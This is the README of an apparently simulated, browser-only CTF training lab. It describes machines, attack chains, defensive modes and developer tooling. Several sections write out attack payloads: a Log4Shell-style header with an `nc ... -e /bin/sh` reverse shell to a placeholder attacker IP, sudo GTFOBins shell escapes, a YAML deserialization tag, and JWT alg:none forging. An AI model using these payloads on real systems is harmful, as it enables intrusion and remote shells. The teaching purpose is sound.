# CTF Lab

Mini plateforme façon RootMe/HackTheBox : terminal simulé en vanilla JS (aucune dépendance), inspirée de la structure de LinuxDojo.

## Lancer le projet

Aucun build : ouvre simplement `index.html` dans un navigateur.

## Structure

```
index.html        Page + layout (sidebar machines + terminal)
css/style.css      Thème sombre / clair / contraste élevé, effets FX
js/machines.js     Données des 20 machines (fs, services, creds, exploits, indices)
js/engine.js        Moteur : FS virtuel, commandes, pipes, scoring, badges, records, write-up, sauvegarde
js/app.js           Liaison DOM <-> moteur (input, prompt, toasts, sidebar, particules, PWA)
manifest.json      Manifeste PWA (installation, icône, nom)
sw.js               Service worker (cache hors-ligne)
icon.svg            Icône de l'application
```

## Progression

Chaque machine suit 4 chapitres : **Recon → Accès initial → Élévation de privilèges → Flag**.
Terminer le flag root d'une machine débloque la suivante. La progression, le score et les indices
utilisés sont sauvegardés dans le `localStorage` du navigateur (clé `ctf_lab_save_v1`).

- **NIMBUS** (facile) — FTP anonyme → fuite d'identifiants → SSH → sudo GTFOBins (`less`)
- **VORTEX** (facile) — API REST avec IDOR (`/api/users/<id>`) → SSH → sudo GTFOBins (`man`)
- **CERBERUS** (moyen) — fichier `.env` exposé → réutilisation de mot de passe → cron job world-writable
- **OBSIDIAN** (difficile) — backup exposée avec creds → binaire SUID `find` mal configuré
- **PHANTOM** (difficile) — LFI via `?page=` → injection SQL (bypass de login) → sudo GTFOBins (`awk`)
- **MERIDIAN** (difficile) — LFI via `?file=` sur un export de rapport → sudo GTFOBins (`python3`)
- **GLACIER** (expert, **Windows**) — FTP anonyme → SSH (OpenSSH for Windows) → tâche planifiée SYSTEM
  avec script modifiable
- **AETHER** (moyen) — API de ticketing MongoDB vulnérable à une **injection NoSQL** (opérateur
  `$ne`/`$gt` glissé dans le body JSON du login, `curl -d`) → fuite d'identifiants SSH → sudo GTFOBins
  (`taskset 1 /bin/sh`)
- **ECLIPSE** (difficile) — générateur de rapports vulnérable à une **SSTI** (Server-Side Template
  Injection, façon Jinja2) : `?name={{7*7}}` confirme l'évaluation côté serveur, puis un gadget
  `os.popen(...)` avec callback `nc` donne un shell → sudo GTFOBins (`nice /bin/sh`)
- **STRATUS** (difficile) — bucket de stockage objet public (`cloudctl`) → fuite d'un `deploy.env` →
  SSH → sudo GTFOBins (`env`)
- **NEXUS** (difficile) — upload de webshell mal filtré (`curl -F` d'un `.php` déguisé) → reverse shell
  www-data → sudo GTFOBins (`tar --checkpoint`)
- **CITADEL** (expert) — **hôte interne** injoignable directement : pivot via NEXUS rooté (`ssh -L`) →
  SSH sur l'IP interne → sudo GTFOBins (`perl`). Une fois le tunnel établi, `nmap 172.16.20.0/24`
  balaie le **sous-réseau interne** (plusieurs hôtes, dont des leurres) et `arp -a` montre la table ARP.
- **VESPER** (difficile) — service d'import de documents vulnérable à une **XXE** (XML External
  Entity) : une entité externe `SYSTEM "file://..."` déclarée dans la DTD d'un document XML
  (`curl -d '<xml...>'`) fait fuiter le fichier de config du service → identifiants SSH → sudo
  GTFOBins (`setsid /bin/sh`)
- **TEMPEST** (difficile) — CI/CD avec un bucket de déploiement **inscriptible** (`cloudctl cp`) dont le
  contenu est exécuté par le pipeline (RCE) → shell `ci` → sudo GTFOBins (`nmap --interactive`)
- **PULSAR** (difficile) — service d'import de configuration vulnérable à une **désérialisation YAML**
  non sécurisée (tag `!!python/object/apply:os.system [...]` interprété par un chargeur permissif,
  `curl -d`) → RCE directe (callback `nc`) → sudo GTFOBins (`timeout 7d /bin/sh`)
- **PARALLAX** (difficile) — outil d'aperçu de lien vulnérable à une **SSRF** (`/preview?url=`) → fuite
  d'un rôle IAM puis d'un jeton temporaire via un faux endpoint de métadonnées cloud
  (`169.254.169.254`) → `cloudctl assume-role` débloque un bucket protégé par rôle → SSH → **capability
  Linux** `cap_setuid+ep` sur `python3.11` (`getcap`), une alternative au SUID classique
- **SENTRY** (difficile) — API interne protégée par **JWT**, vulnérable à la faille classique
  **"alg:none"** (la signature n'est jamais vérifiée si le jeton l'annonce) → un jeton forgé à la main
  (`base64url`/`base64urld` en pipe) avec un rôle admin fuite des identifiants SSH → sudo GTFOBins sur
  `vim` (`sudo vim -c ':!/bin/sh'`)
- **RELIC** (moyen) — dossier `.git` déployé par erreur avec l'application → historique de commits
  navigable avec `git log`/`git show` (simulés) → un ancien commit "sera retiré avant le merge" fuite
  des identifiants SSH, toujours lisibles dans son diff malgré un commit correctif ultérieur → sudo
  GTFOBins sur `git` (`sudo git -p help config`, même mécanique pager que less/man)
- **ECHOLOG** (difficile) — service de journalisation vulnérable à une **injection JNDI façon
  Log4Shell** (CVE-2021-44228) : un en-tête `User-Agent` contenant `${jndi:ldap://...}` est évalué par
  une bibliothèque de logs non patchée au lieu d'être simplement journalisé → RCE directe (callback
  `nc`) → sudo GTFOBins (`gdb -nx -ex '!sh' -ex quit`)
- **AXIOM** (insane) — logs CI/CD exposés → SSH → appartenance au groupe `docker` (équivalent root via
  montage du disque hôte dans un conteneur)

💡 Chaque machine cache aussi un `note_interne.txt` dans le dossier personnel de l'utilisateur compromis
— un léger fil narratif transversal (aucun impact sur le gameplay, juste un easter egg à lire au fil
de la progression).

## Progression, badges & niveau

En plus du score, chaque machine terminée peut débloquer des **badges** (🎯 sans indice, ⚡ speedrun
&lt;5 min, 🏆 perfectionniste, 🌐 tour complet), visibles dans la sidebar ou via la commande `badges`.
Chaque mini-mode a aussi son propre badge de complétion (🧩 Codebreaker pour Jeopardy, 🛡️ Analyste
SOC pour Blue Team, 🧱 Ingénieur réseau pour le pare-feu, 📧 Anti-hameçonnage pour le phishing, 🔬
Reverse engineer, 🧠 Exploiteur pour le buffer overflow) ; les débloquer tous donne le badge capstone
**👑 Grand chelem**, le vrai « 100% » du jeu — seul badge à recevoir un traitement visuel doré distinct
(pastille, halo pulsant, toast dédié) pour le distinguer des autres.
Le score se traduit aussi en **niveau/XP** (barre dans l'en-tête, 500 pts par niveau). Chaque flag root
capturé affiche une petite **fiche CVE/CVSS pédagogique** générée localement, décrivant la technique de
privesc utilisée. La commande `records` affiche tes **meilleurs temps locaux** par catégorie (Any%,
Sans indice, Premier essai sudo), et `writeup <machine> [--download]` génère un **compte-rendu Markdown**
de la machine terminée (à afficher dans le terminal ou à télécharger en `.md`). Un bouton ✨ dans l'en-tête
active/désactive les effets visuels (glow, scanlines, particules à la capture d'un flag) si tu préfères
une interface plus sobre.

## Mode Insane (sans indices)

La commande `insane on` désactive `hint`/`chint` pour toute la partie (machines et défis Jeopardy) en
échange d'un score multiplié par 1.5. Elle ne peut être activée (ou désactivée) que sur une sauvegarde
neuve — score à 0, aucune machine ni défi entamé — pour éviter toute incohérence de scoring en cours de
route. `insane` sans argument affiche l'état courant.

## Export / import de sauvegarde

`export <passphrase>` chiffre l'intégralité de la progression (score, machines, badges, défis
Jeopardy...) avec AES-GCM 256 (clé dérivée de la passphrase via PBKDF2-SHA256, 150 000 itérations,
API native `Web Crypto` — zéro dépendance) et télécharge un fichier `.json.enc`. La passphrase n'est
stockée nulle part : sans elle, le fichier est inutilisable. `import` ouvre un sélecteur de fichier,
puis demande la passphrase utilisée à l'export ; en cas de succès, la progression locale est
entièrement remplacée. Pratique pour transférer sa partie d'un navigateur ou d'un appareil à
l'autre sans backend.

## Mode Jeopardy

En plus des 20 machines en mode boîte, un mini mode Jeopardy propose 11 défis indépendants
(Crypto ×4, Forensics ×2, Misc ×1, Stégano ×1, Réseau ×1, Pwn ×1, OSINT ×1) : `challenges` pour la
liste, `challenge <id>` pour l'énoncé, `chint <id>` pour des indices progressifs, `submit <id> <flag>`
pour valider. Les points s'ajoutent au score global (donc au niveau/XP). Le défi "Mot de passe
recyclé" s'appuie sur un vrai petit casseur de hash simulé (`hashcat <hash>` / `hashcat --list`), avec
un algorithme maison fictif (hash-VX) — pédagogique, pas un vrai MD5/SHA. Le défi "RSA au rabais" fait
factoriser un module RSA volontairement minuscule pour retrouver la clé privée. Le défi "Photo de
vacances suspecte" cache un flag dans un faux champ de métadonnées EXIF (aucun vrai binaire image à
parser). Le défi "Signal capté sur l'antenne" décode un message morse. Le défi "Paquet capturé sur le
fil" convertit une charge utile réseau hexadécimale en ASCII. Le défi "Compteur qui déborde" illustre
un débordement d'entier signé sur 8 bits (`int8`, complément à deux) — la même classe de bug que de
vraies vulnérabilités mémoire, ici sans exécution de code, juste du calcul. Le défi "Signature
énigmatique" (OSINT) décode une suite de codes ASCII décimaux, avec un clin d'œil au fil narratif
transversal du lab. La commande `daily` met en avant un défi différent chaque jour (seed = date du
jour).

## Mode Blue Team

En complément de l'attaque, un mode **défense** façon SOC : 5 incidents où tu reçois un dump de
logs (auth.log brute-force SSH, access.log Nginx LFI/path-traversal, scan `sqlmap`, résolveur DNS
avec exfiltration par sous-domaines encodés, journal d'audit `auditd` avec abus sudo/GTFOBins) et
dois répondre à des questions d'analyse. `blueteam` liste les incidents, `incident <id>` affiche le
scénario + les logs + les questions, `answer <id> <question> <valeur>` soumet une réponse (tolérante
à la casse et aux espaces, plusieurs formulations acceptées), `bthint <id> <question>` donne un
indice. Chaque incident entièrement résolu rapporte des points ; les résoudre tous débloque le
badge **🛡️ Analyste
SOC**. Tout est généré en dur (aucun IDS ni backend).

## Buffer overflow (pédagogique)

La commande **`stack`** (ou le bouton **🧠**) ouvre un défi **buffer overflow 100 % simulé** : un
schéma SVG de la pile (`char buf[16]` → RBP sauvé → adresse de retour). Tu ajustes le nombre d'octets
de **bourrage** et l'**adresse de retour**, et les blocs se colorent en temps réel (ambre = écrasé
par le bourrage, rouge = mauvaise adresse sur la RET, **vert = adresse de retour détournée vers
`win()`** — offset 24, `0x401156`). Réussir crédite des points et débloque le badge **🧠 Exploiteur
(pédagogique)**. **Aucun code réel n'est exécuté** : c'est un support visuel, pas d'exploitation
binaire réelle.

## Graphe d'attaque

La commande **`graph [machine]`** (ou le bouton **🗺️**) ouvre une modale qui affiche le **graphe
d'attaque** de la machine en SVG : recon → accès initial → élévation de privilèges → flag root (avec
le flag user en branche), chaque nœud annoté de sa technique (déduite de la machine). Les nœuds et
les arêtes **s'allument en vert** à mesure que tu progresses et restent **grisés** tant que l'étape
n'est pas atteinte. Un sélecteur permet de basculer entre les machines débloquées.

## Reverse engineering

Un chapitre forensic/malware : 3 faux binaires à analyser (un dropper/C2 `update.bin`, un
vérificateur de licence `license.bin`, une bombe logique `cleanup.bin`). `malware` liste les
échantillons, `strings <id>` dump les chaînes lisibles (domaine C2, clé, mutex…), `disas <id>`
affiche un **désassemblage x86 simplifié** maison (mnémoniques en dur commentés : `connect` vers le
C2, boucle de déchiffrement XOR, `strcmp` sur une clé en dur, comparaison d'un timestamp `time()` à
une constante avant un `rm -rf` déclenché en conditions — aucun vrai moteur de désassemblage).
Réponds avec `resolve <id> <question> <valeur>` (ex. le domaine C2, la clé XOR, la clé de licence, la
constante epoch qui déclenche la bombe logique), `rehint <id> <question>` pour un indice. Chaque
échantillon élucidé rapporte des points ; les trois débloquent le badge **🔬 Reverse
engineer**.

## Chapitre phishing

Un pendant « boîte mail » du Blue Team : 5 mails à analyser (un « support IT » usurpé, une newsletter
légitime, une fausse facture en `.exe`, une notification d'outil légitime mais qui pourrait sembler
suspecte au premier abord, et une fraude au président — BEC — avec un domaine typosquatté).
`phishing` (ou `inbox`) liste les mails, `mail <id>` affiche
les en-têtes simulés (From, Reply-To, Return-Path, Received-SPF), le corps, les liens et pièces
jointes. `report <id> verdict phishing|legitime` classe le mail ; pour un phishing, il faut aussi
`report <id> indice <mot-clé>` (l'indicateur peut être formulé librement : domaine usurpé, `.ru`, SPF
fail, urgence, double extension, typosquat…). `phhint <id> <question>` donne un indice. Chaque mail
bien traité rapporte des points ; tous les traiter débloque le badge **📧 Anti-hameçonnage**.

## Pare-feu simulé (iptables)

Trois scénarios défensifs où tu lis et modifies un jeu de règles façon `iptables` pour atteindre des
objectifs (durcir le serveur : n'ouvrir que 80/443 + SSH depuis le LAN ; bloquer un attaquant sans
couper le trafic web ; corriger une règle trop permissive pour isoler une base de données). `firewall`
liste les scénarios, `firewall <id>` en démarre un (affiche les
règles + une checklist d'objectifs), puis tu joues avec `iptables -L`, `-A`/`-I`/`-D`, `-P INPUT
ACCEPT|DROP`, `-F`. Les objectifs se cochent en direct ; tout valider rapporte des points et, les
trois scénarios résolus, le badge **🧱 Ingénieur réseau**. Le 2ᵉ scénario enseigne l'importance de
l'**ordre des règles** (première correspondance gagne — il faut *insérer* le DROP avant la règle
ACCEPT) ; le 3ᵉ oblige à *supprimer* une règle trop permissive (`-D`) avant d'en ajouter une plus
stricte. Moteur de règles maison (matching IP/CIDR, proto, port), aucun vrai pare-feu.

## SSRF, métadonnées cloud & capabilities Linux (PARALLAX)

Deux techniques supplémentaires, illustrées par la machine **PARALLAX** :

- **SSRF (Server-Side Request Forgery)** : un endpoint web (`/preview?url=<url>`) va chercher une URL
  pour le compte du serveur. `curl "<url>?url=<cible>"` déclenche la requête ; seule une cible précise
  répond utilement (un faux endpoint de métadonnées cloud interne, façon AWS
  `169.254.169.254/latest/meta-data/...`), toute autre URL renvoie un message générique (trafic sortant
  réel simulé comme filtré). La métadonnées fuite un rôle IAM puis, une fois interrogée plus
  précisément, un jeton de sécurité temporaire.
- **Rôle IAM assumé** : `cloudctl assume-role <token>` échange le jeton fuité contre un rôle actif
  (`SESSION.cloudRole`) qui débloque les buckets marqués `requiresRole` (ni publics, ni simplement
  privés — une 3ᵉ politique d'accès pour `cloudctl ls|get`), révélant alors des identifiants SSH.
- **Capabilities Linux** (`getcap -r /`) : une alternative plus fine au bit SUID classique — une
  capability comme `cap_setuid+ep` accordée à un interpréteur (`python3.11`) permet de s'attribuer
  l'uid 0 sans que le binaire soit marqué SUID (donc invisible à `find -perm -4000`).

## JWT "alg:none" (SENTRY)

Une faille réelle et classique des jetons JWT mal implémentés, illustrée par la machine **SENTRY** :
un jeton a 3 parties séparées par des points (en-tête, charge utile, signature), et certaines
implémentations sautent totalement la vérification de signature si l'en-tête annonce
`"alg":"none"`. Concrètement :

- Décoder un segment de jeton : `echo '<segment>' | base64urld`.
- Forger un jeton à la main, segment par segment : `echo -n '{"alg":"none","typ":"JWT"}' | base64url`
  puis `echo -n '{"role":"admin", ...}' | base64url`, assemblés en `<en-tête>.<payload>.` (point
  final = signature vide).
- L'envoyer avec `curl -H "Authorization: Bearer <jeton>" <url>`.

Aucune cryptographie n'est simulée (pas de vrai HMAC) : c'est fidèle à la faille elle-même, qui ne
dépend jamais de casser une signature — seulement de convaincre le serveur de ne pas la vérifier.

## Injection JNDI façon Log4Shell (ECHOLOG) & dépôt `.git` exposé (RELIC)

Deux nouvelles familles de vulnérabilités, chacune illustrée par une machine dédiée :

- **Injection JNDI (CVE-2021-44228, "Log4Shell")** : sur **ECHOLOG**, un endpoint de journalisation
  logue tel quel n'importe quel en-tête de requête HTTP (`User-Agent` par défaut). Une bibliothèque de
  logs non patchée évalue les lookups `${jndi:ldap://...}` qu'elle y trouve au lieu de les traiter
  comme du texte. Le lab simplifie le vecteur réel (qui charge normalement une classe distante via un
  second service LDAP) en un callback direct, comme les autres RCE du lab : `curl -H 'User-Agent:
  ${jndi:ldap://<ip_attaquant>:1389/x;nc <ip_attaquant> <port> -e /bin/sh}' <url>` après une écoute
  `nc -lvnp <port>` — **guillemets simples obligatoires** pour éviter que le shell simulé n'interprète
  `${...}` comme une expansion de variable (comme en vrai bash, d'ailleurs, avec ce genre de payload).
- **Dépôt `.git` exposé** : sur **RELIC**, le déploiement s'est fait par simple copie du dossier de
  travail, dossier `.git` inclus. Le lab expose un historique de commits en dur, navigable avec deux
  nouvelles commandes simulées (pas un vrai clone ni un vrai parsing d'objets git compressés) :
  `git log <ip>` liste les commits (hash court + message), `git show <ip> <hash>` affiche le diff
  complet d'un commit (les premiers caractères du hash suffisent). Un secret présent dans un ancien
  commit reste parfaitement lisible même après un commit correctif ultérieur — l'historique, lui, ne
  ment pas.

## Accessibilité & hors-ligne

Le bouton de thème (🌙/☀️/◐) propose désormais un 3ᵉ thème **contraste élevé**. Le terminal utilise
`role="log"` + `aria-live="polite"`, et les cartes de machines sont navigables au clavier (Tab + Entrée).
Le jeu est aussi installable comme **PWA** (manifest + service worker) pour être rejoué hors-ligne une
fois la première visite effectuée — toujours sans aucun backend.

Le bouton 🎧 dans l'en-tête active une **ambiance sonore procédurale continue** (oscillateurs Web Audio
API, zéro fichier audio) : le preset change automatiquement selon la difficulté de la machine sur
laquelle tu es connecté (plus grave et plus tendu à mesure que la difficulté monte). Désactivée par
défaut ; le son de capture de flag (bouton 🔈) est indépendant de ce toggle.

Le bouton 🗣️ active une **narration vocale** (API native `SpeechSynthesis`, zéro dépendance) : les
indices (`hint`/`chint`) et les messages importants (flag capturé, badge débloqué, machine débloquée)
sont lus à voix haute en français. Désactivée par défaut, et n'importe jamais les sorties brutes
(`ls`, `cat`, `nmap`...).

`vim <fichier>` (alias `vi`, `nano`) ouvre un mini-éditeur modal très simplifié : une fois
dedans, chaque ligne tapée est ajoutée au buffer plutôt qu'interprétée comme une commande.
`:wq` enregistre et quitte, `:q!` quitte sans rien sauver, `:show` réaffiche le buffer en
cours. Une alternative plus réaliste à `echo '...' >> fichier` pour les étapes de privesc
qui demandent d'éditer un script (ex : le cron piégeable de CERBERUS).

## Commandes principales

Recon : `nmap <ip>`, `curl <url>` (GET, ou POST avec `-d "champ=valeur"`), `ftp <ip>`, `nc <ip> <port>` (bannière brute), `nc -lvnp <port>` (écoute, pour attraper une reverse shell si une machine le propose), `cloudctl ls|get|cp|assume-role` (stockage objet simulé + prise de rôle IAM), `curl "<url>?param=<url_interne>"` (SSRF vers une ressource interne, ex. métadonnées cloud)
Accès : `ssh user@ip [-p port]`, `curl -F "file=@<webshell>" <url>` (upload sur un formulaire mal filtré), `ssh -L <lport>:<hôte_interne>:<port> user@<pivot>` (tunnel de pivot vers un hôte interne, une fois le pivot rooté), `curl -H "Authorization: Bearer <jwt>" <url>` (jeton d'authentification, répétable), `curl -H '<En-tête>: <payload>' <url>` (injection via en-tête, ex. JNDI/Log4Shell — guillemets simples si le payload contient `${...}`), `git log <ip>` / `git show <ip> <hash>` (dépôt `.git` exposé, simulé)
Système (Linux) : `ls [-la]`, `cd`, `pwd`, `cat`, `find`, `getcap -r /` (capabilities Linux, alternative au SUID), `echo [-n]`, `vim <fichier>` (alias `vi`/`nano`), `whoami`, `id`, `groups`, `sudo -l`, `sudo <cmd>`, `crontab -l`, `docker ps`
Système (Windows, sur une machine cible Windows) : `dir`, `type`, `net user`, `net localgroup administrators`,
`schtasks /query`, `icacls <fichier>` (les alias `ls`/`cat` fonctionnent aussi, comme dans PowerShell)
Pipes : `grep`, `wc -l`, `sort [-u]`, `head`, `tail`, `cut`, `awk '{print $N}'`, `base64url` / `base64urld` (encodage/décodage sans dépendance, pour forger un JWT à la main)
Méta : `machines`, `use <nom>`, `reset <nom>`, `hint`, `insane [on|off]`, `progress`, `badges`, `records`, `writeup <nom> [--download]`, `export <passphrase>`, `import`, `score`, `help`, `clear`, `exit`
Jeopardy : `challenges`, `challenge <id>`, `chint <id>`, `submit <id> <flag>`, `hashcat <hash>`, `daily`

## Shell (parser)

Le terminal dispose d'un vrai petit parser (dans `js/engine.js`) : guillemets simples/doubles
imbriqués et concaténés, **variables** intégrées `$USER`, `$HOME`, `$PWD`, `$HOSTNAME`, `$UID`,
`$?` (et la forme `${VAR}`) développées hors guillemets simples, **substitution de commande**
`$(...)`, et **redirections** `>`, `>>`, `2>`, `&>`, `2>&1`, `2>/dev/null`. Exemples :
`echo "connecté en tant que $USER"`, `cat $(echo user.txt)`, `find / -perm -4000 2>/dev/null`.

Deux choix assumés : les backslash restent **littéraux** (pas d'échappement bash) pour que les
chemins Windows des machines cibles (`C:\Scripts\backup.bat`) fonctionnent, et les variables sont
en **lecture seule** (`export` est déjà la commande de sauvegarde chiffrée, pas une assignation).

## Langues (FR / EN)

Le bouton **🌐** de l'en-tête (ou le lien `index.html#en`) bascule l'interface entre **français et
anglais** à chaud (choix mémorisé). L'i18n couvre toute l'interface (en-tête, info-bulles, sidebar,
modales, bannière), l'aide (`help`), les briefings des 20 machines et les messages clés du gameplay
(cible active, accès, toasts de progression). Les indices détaillés et le lore des machines restent
en français pour l'instant (l'infrastructure `i18n.js` / `bilang()` permet de les traduire au fil de l'eau).

## Éditeur de machines intégré

Le bouton 🛠️ de l'en-tête (ou le lien direct `index.html#editor`) ouvre une modale **« Créer une
machine »** : un textarea JSON pré-rempli d'un modèle valide, un bouton **« Valider & charger »**
et un bouton **« Télécharger .json »**. Le moteur (`loadCustomMachine`) compile les regex d'exploit
(écrites en chaînes, ou sous la forme `{ "__regex__": ..., "__flags__": ... }` de `machines.json`),
valide le schéma via `validateMachines`, refuse toute collision d'id/ip, puis injecte la machine
dans le lab — **déverrouillée et immédiatement jouable** dans le terminal (recon → accès → privesc
→ flags). Elle est marquée `custom` : exclue des badges « tour complet »/« perfectionniste » et
**non sauvegardée** (bac à sable, elle disparaît au rechargement). Le `.json` téléchargé se colle
tel quel dans `MACHINES` (`js/machines.js`) pour la rendre permanente.

Le bouton **« Lien de partage »** encode la machine en base64url dans un lien
`index.html#machine=<token>` (copié dans le presse-papiers) : ouvrir ce lien décode, valide et
charge automatiquement la machine — un scénario se partage donc en une URL, sans aucun serveur.

La commande **`generate [seed]`** (ou le bouton **🎲 Générer** de l'éditeur) produit une machine
**procédurale** jouable : un algorithme JS pur (PRNG seedé, zéro IA) combine une brique de vecteur
d'accès (FTP / config web / bucket cloud) et une brique de privesc (sudo GTFOBins) tirées de pools.
Le seed est déterministe (même seed → même machine), donc une machine générée se rejoue ou se
partage à l'identique.

## Bac à sable libre

La commande **`sandbox`** (ou le bouton **🧪**) monte une session `hacker@sandbox` avec un système
de fichiers **à toi**, **sans machine, sans flag ni score** : juste pour s'entraîner aux commandes
(`ls`, `cd`, `cat`, `find`, `grep`, `cut`, `awk`, `wc`, `vim`, pipes…). `sandbox` seul charge un FS
de démo ; la modale 🧪 permet de coller son propre FS au format `{ "chemin": "contenu" }` (une chaîne
= fichier, `{}` ou un `/` final = dossier ; chemins relatifs à `~` sauf s'ils commencent par `/`).
`sandbox reset` (ou `exit`) revient sur la machine kali.

## Replay de session

Chaque commande et sa sortie sont enregistrées en mémoire. Le bouton **▶️** de l'en-tête (ou la
commande **`replay`**) ouvre un overlay qui **rejoue** ta session façon asciinema (frappe animée +
sorties), **sans ré-exécuter** les commandes — ta progression n'est donc pas modifiée. `replay save`
(ou le bouton **« Télécharger .json »**) exporte le replay ; **« Charger un replay »** en rejoue un
importé. `replay clear` remet le compteur à zéro. Zéro dépendance, 100% côté client.

## Ajouter une machine

Ajoute un objet dans `MACHINES` (`js/machines.js`) avec le même schéma que les machines
existantes (ports, web, ftp, sshUsers, targetFS, privesc, rootFile, hints). Le moteur
(`engine.js`) n'a rien à changer tant que le type de privesc reste `sudo-gtfobins`,
`sudo-direct`, `cron-writable`, `suid-binary`, `schtask-writable`, `docker-group` ou `capability`.

Pour une machine web vulnérable à une LFI/SQLi (comme PHANTOM), pas de code moteur à toucher :
- LFI : ajoute directement la clé `chemin?param=valeur` dans `machine.web`, `curl` la sert telle quelle.
- SQLi : ajoute un objet `machine.sqli = { path, injectionRegex, successBody, failBody }`,
  déclenché par `curl -d "champ=valeur" <url>`.
- Injection NoSQL (comme AETHER) : ajoute `machine.nosqli = { path, injectionRegex, successBody, failBody }`,
  même mécanique que `sqli` mais pensée pour un body JSON contenant un opérateur MongoDB
  (`$ne`, `$gt`, `$regex`...) au lieu d'une chaîne littérale — déclenché par `curl -d '<json>' <url>`.
- SSTI / Server-Side Template Injection (comme ECLIPSE) : ajoute `machine.ssti = { path, param, pocRegex,
  pocResponse, injectRegex, user }`. `curl "<url><path>?<param>=<valeur>"` renvoie `pocResponse` si la
  valeur matche `pocRegex` (typiquement une expression de calcul du style `{{7*7}}`, preuve que le moteur
  de templates évalue l'entrée), sinon déclenche le même mécanisme de callback `nc <ip> <port>` que
  `altAccess` si `injectRegex` matche (le moteur parse l'IP/port du payload joueur).
- XXE / XML External Entity (comme VESPER) : ajoute `machine.xxe = { path, secretPath, entityRegex,
  successBody, notFoundBody, failBody }`. Déclenché par `curl -d '<xml...>' <url>` : `entityRegex` capture
  le chemin déclaré par l'entité externe (`SYSTEM "file://<chemin>"`) ; s'il correspond exactement à
  `secretPath`, le moteur renvoie `successBody` (typiquement une fuite de creds), sinon `notFoundBody` si
  une entité a bien été détectée mais vise un autre fichier, sinon `failBody`.
- Désérialisation non sécurisée (comme PULSAR, façon YAML) : ajoute `machine.yamldeser = { path,
  injectRegex, invalidBody, user }`. Déclenché par `curl -d '<payload>' <url>` : si `injectRegex` matche
  (typiquement un tag `!!python/object/apply:os.system [...]` contenant `nc <ip> <port>`), déclenche le
  même mécanisme de callback `nc` que `altAccess`/`ssti` (parsing IP/port depuis le payload joueur),
  sinon renvoie `invalidBody`. Contrairement à `nosqli`, pas de bypass d'authentification ici : le payload
  malveillant donne directement une RCE dès qu'il est chargé côté serveur.
- Reverse shell / injection de commande (comme MERIDIAN et PHANTOM) : ajoute
  `machine.altAccess = { path, injectRegex, user }`. `path` est l'endpoint vulnérable (sans
  query), `injectRegex` reconnaît une injection de commande dans la query (ex :
  `/file=[^;&]*;\s*nc\b/i`), `user` est le compte obtenu. Le moteur parse l'IP/port du callback
  directement depuis le payload `nc <ip> <port>` du joueur : l'accès n'est accordé que si l'IP
  vaut `ATTACKER_IP` **et** que le port correspond à l'écoute lancée avec `nc -lvnp <port>`. Le
  joueur choisit donc librement son port — aucune valeur n'est câblée en dur côté machine.
- Upload de webshell (comme NEXUS) : ajoute `machine.upload = { formPath, filenameRegex, webshellPath, user }`
  (le `curl -F` accepte un fichier dont le nom matche `filenameRegex`), puis un `machine.altAccess`
  pointant sur `webshellPath` avec `requiresUpload: true` (le webshell renvoie 404 tant qu'on n'a pas uploadé).
- SSRF (comme PARALLAX) : ajoute `machine.ssrf = { path, param, responses: { "<url_cible>": "<contenu>" }, blockedMsg }`.
  `curl "<url_machine><path>?<param>=<url_cible>"` renvoie `responses[<url_cible>]` si elle existe,
  sinon `blockedMsg` — aucune autre cible n'est jamais atteignable (pas de simulation réseau générale).
- Cloud mal configuré (comme STRATUS) : ajoute `machine.cloud = { provider, buckets: { "<nom>": { public, files } } }`.
  La commande `cloudctl` liste/lit les buckets `public` et refuse les privés — aucun code moteur à toucher.
  Un bucket peut aussi être protégé par rôle plutôt que public/privé : `{ public: false, requiresRole: "<rôle>", files }`,
  combiné à `machine.cloud.assumableRole = { role, token }` (typiquement révélé via une SSRF vers des
  métadonnées cloud). `cloudctl assume-role <token>` échange le jeton contre le rôle actif de la session.
- Capability Linux (comme PARALLAX) : `privesc = { type: "capability", exploitCmdRegex, enterMsg }` et
  `targetFS.capabilities = ["<chemin_binaire> = <capability>"]` (affiché par `getcap -r /`) — alternative
  au bit SUID, avec le même mécanisme d'exploitation par regex exacte que `suid-binary`/`docker-group`.
- Authentification JWT "alg:none" (comme SENTRY) : ajoute `machine.jwtAuth = { path, header, requireClaim: { key, value }, successBody, missingMsg, deniedMsg }`.
  Le endpoint accepte `curl -H "Authorization: Bearer <jwt>" <url>` : le jeton n'est validé que si son
  en-tête décodé porte `"alg":"none"` **et** que la charge utile contient `requireClaim` — jamais de
  vraie vérification de signature simulée, fidèle à la faille réelle.
- Machine interne / pivot (comme CITADEL) : mets `internal: true` et `pivot: { via, pivotIp }`. Le moteur
  rend l'IP injoignable (`nmap`/`ssh`/`curl`) tant qu'un tunnel `ssh -L <lport>:<ip_interne>:<port> user@<pivotIp>`
  n'a pas été ouvert — et ce tunnel exige que la machine pivot (`pivotIp`) soit déjà rootée.
- Injection JNDI façon Log4Shell (comme ECHOLOG) : ajoute `machine.jndi = { path, header, injectRegex, user }`
  (`header` par défaut : `user-agent`). `curl -H '<en-tête>: <payload>' <url><path>` déclenche le même
  mécanisme de callback `nc <ip> <port>` que `altAccess`/`ssti`/`yamldeser` si `injectRegex` matche la
  valeur de l'en-tête, sinon renvoie un accusé de réception générique (l'en-tête a bien été "logué").
- Dépôt `.git` exposé (comme RELIC) : ajoute `machine.gitLeak = { commits: [{ hash, message, diff }, ...] }`.
  Les nouvelles commandes `git log <ip>` / `git show <ip> <hash>` (aucun changement de moteur au-delà de
  `cmdGit`, réutilisable par n'importe quelle machine) listent/affichent cet historique en dur — un secret
  présent dans un commit reste lisible même après un commit correctif ultérieur dans la liste.

Pour une machine Windows (comme GLACIER), ajoute `osType: "windows"` sur l'objet machine :
le FS interne reste en chemins unix (`/Users/xxx`), `resolvePath` traduit automatiquement les
chemins `C:\...` saisis par le joueur, et l'affichage (`prompt`, `dir`, `pwd`, `whoami`) bascule
tout seul en style Windows.

## Tests

`node tests/run.js` lance une suite de tests zéro-dépendance (Node uniquement, pas de framework)
qui charge `machines.js` + `engine.js` dans un contexte isolé et rejoue : le parsing/les pipes,
l'exploitation complète des 20 machines (recon → accès → privesc → 2 flags chacune), le
remboursement de `reset`, la résolution des 11 défis Jeopardy et le mode Insane. À lancer après
toute modification de `engine.js` ou `machines.js` pour éviter une régression silencieuse.

`node tools/solve.js` est un **solveur automatique** (dev only, jamais embarqué dans le jeu) :
il rejoue la solution officielle des 20 machines dans le vrai moteur et vérifie qu'aucun chemin
d'exploit n'est cassé (les 5 jalons + le flag root de chaque machine). Code de sortie non-nul
en cas de régression, donc utilisable en CI. Options : `--verbose` (chaque commande + sa sortie),
`--walkthrough` (pas-à-pas propre), `--machine <id>` (une seule machine). Utile comme smoke test
rapide et comme générateur de walkthrough après une modification du moteur.

`node tools/export-machines-json.js` sérialise les données des machines en **JSON pur**
